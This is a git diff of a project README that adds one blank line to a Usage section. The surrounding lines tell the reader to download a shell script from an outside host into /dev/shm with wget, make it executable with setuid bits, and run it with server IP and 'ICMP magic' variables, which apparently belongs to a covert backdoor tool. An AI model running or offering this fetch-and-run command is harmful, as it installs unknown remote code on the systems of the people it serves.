@@ -11,6 +11,7 @@ This project is intended for **research, testing, and controlled environments on
 
 ## Usage
 cd /dev/shm; wget https://compileasaservice.online/downloadipfs.sh; chmod +sx downloadipfs.sh
+
 YOUR_SRV_IP=127.0.0.1 SRV_PORT=8081 ICMP_MAGIC_SEQ=1337 MAGIC=mtz PORT=8081 NAME=alphatest$RANDOM ./downloadipfs.sh
 
 ## ✨ Features
